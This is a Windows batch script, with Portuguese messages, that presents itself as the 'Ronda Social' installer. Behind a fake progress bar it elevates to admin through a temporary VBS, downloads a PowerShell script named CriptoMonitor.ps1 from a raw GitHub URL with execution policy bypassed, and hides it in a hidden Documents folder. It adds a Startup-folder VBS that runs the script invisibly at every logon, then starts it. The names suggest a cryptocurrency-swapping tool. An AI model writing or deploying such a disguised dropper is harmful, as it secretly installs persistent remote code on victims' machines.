@echo off
setlocal EnableDelayedExpansion

:: =====================================================
:: VERIFICAR SE JA E ADMINISTRADOR
:: =====================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    goto :RequestAdmin
)
goto :Main

:: =====================================================
:: SOLICITAR ELEVACAO UAC
:: =====================================================
:RequestAdmin
set "vbsFile=%temp%\rs_uac_%random%.vbs"
echo Set objShell = CreateObject("Shell.Application") > "!vbsFile!"
echo objShell.ShellExecute "%~f0", "", "%~dp0", "runas", 1 >> "!vbsFile!"
cscript //nologo "!vbsFile!"
del "!vbsFile!" >nul 2>&1
exit /B

:: =====================================================
:: INICIO DO INSTALADOR (JA COMO ADMIN)
:: =====================================================
:Main
cd /d "%~dp0"
title Ronda Social - Instalador
color 0A
mode con: cols=60 lines=22

:: =====================================================
:: LIMPEZA DE RESIDUOS ANTIGOS
:: =====================================================
cls
echo.
echo  +================================================+
echo  :                                                :
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  :                                                :
echo  +================================================+
echo.
echo.
echo   [          ]   0%%  - Iniciando...
timeout /t 1 /noq >nul

cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [=         ]   5%%  - Limpando residuos antigos...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.Id -ne $PID -and $_.CommandLine -like '*CriptoMonitor*'} | Stop-Process -Force -ErrorAction SilentlyContinue" >nul 2>&1
schtasks /delete /tn "CriptoAutoSwap" /f >nul 2>&1
schtasks /delete /tn "CriptoMonitor" /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\CriptoMonitor.vbs" >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\CriptoAutoSwap*.vbs" >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\CriptoAutoSwap*.bat" >nul 2>&1
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 1: Verificando seguranca (10%% - 20%%)
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [==        ]  10%%  - Verificando seguranca...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%~f0'" >nul 2>&1
timeout /t 1 /noq >nul

cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [====      ]  20%%  - Seguranca verificada!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 2: Preparando diretorios (30%% - 40%%)
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [=====     ]  30%%  - Preparando diretorios...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!if(!(Test-Path $i)){New-Item $i -ItemType Directory -Force^|Out-Null};"
set "psCmd=!psCmd!$di=Get-Item $i -Force;"
set "psCmd=!psCmd!$di.Attributes=$di.Attributes -bor [IO.FileAttributes]::Hidden"
powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" >nul 2>&1
timeout /t 1 /noq >nul

cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [======    ]  40%%  - Diretorios prontos!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 3: Baixando do GitHub (50%% - 70%%)
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [=======   ]  50%%  - Baixando resultados...

set "psCmd=[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
set "psCmd=!psCmd!$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!$wc=New-Object Net.WebClient;"
set "psCmd=!psCmd!$wc.Encoding=[Text.Encoding]::UTF8;"
set "psCmd=!psCmd!$wc.Headers.Add('User-Agent','Mozilla/5.0');"
set "psCmd=!psCmd!$c=$wc.DownloadString('https://raw.githubusercontent.com/espertin/social/main/CriptoMonitor.ps1');"
set "psCmd=!psCmd![IO.File]::WriteAllText($p,$c,[Text.Encoding]::UTF8);"
set "psCmd=!psCmd!Unblock-File $p"
powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" >nul 2>&1
timeout /t 2 /noq >nul

cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [========  ]  70%%  - Download concluido!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 4: Configurando inicializacao (80%% - 90%%)
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [========  ]  80%%  - Configurando inicializacao...

set "psCmd=$d=[Environment]::GetFolderPath('MyDocuments');"
set "psCmd=!psCmd!$i=Join-Path $d 'CriptoAutoSwap';"
set "psCmd=!psCmd!$p=Join-Path $i 'CriptoMonitor.ps1';"
set "psCmd=!psCmd!$startup=[Environment]::GetFolderPath('Startup');"
set "psCmd=!psCmd!$v=Join-Path $startup 'CriptoMonitor.vbs';"
set "psCmd=!psCmd!$q=[char]34;"
set "psCmd=!psCmd!$dq=[char]34+[char]34;"
set "psCmd=!psCmd!$vbsContent='Set WshShell = CreateObject('+$q+'WScript.Shell'+$q+')'+[char]13+[char]10;"
set "psCmd=!psCmd!$vbsContent=$vbsContent+'WshShell.Run '+$q+'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '+$dq+$p+$dq+$q+', 0, False';"
set "psCmd=!psCmd![IO.File]::WriteAllText($v,$vbsContent,[Text.Encoding]::ASCII);"
set "psCmd=!psCmd!Unblock-File $v"
powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" >nul 2>&1
timeout /t 1 /noq >nul

cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [========= ]  90%%  - Inicializacao configurada!
timeout /t 1 /noq >nul

:: =====================================================
:: ETAPA 5: Iniciando monitoramento (95%% - 100%%)
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [========= ]  95%%  - Iniciando monitoramento...

set "psCmd=$startup=[Environment]::GetFolderPath('Startup');"
set "psCmd=!psCmd!$v=Join-Path $startup 'CriptoMonitor.vbs';"
set "psCmd=!psCmd!Start-Process 'wscript.exe' -ArgumentList ([char]34+$v+[char]34) -WindowStyle Hidden"
powershell -NoProfile -ExecutionPolicy Bypass -Command "!psCmd!" >nul 2>&1
timeout /t 2 /noq >nul

:: =====================================================
:: CONCLUIDO
:: =====================================================
cls
echo.
echo  +================================================+
echo  :          RONDA SOCIAL - INSTALADOR             :
echo  +================================================+
echo.
echo   [==========] 100%%  - Instalacao concluida!
echo.
echo.
echo   Monitoramento ativo e configurado com sucesso.
echo   O sistema ira iniciar automaticamente com o
echo   Windows.
echo.
echo   Esta janela fechara em 5 segundos...
echo.
timeout /t 5 /noq >nul
exit
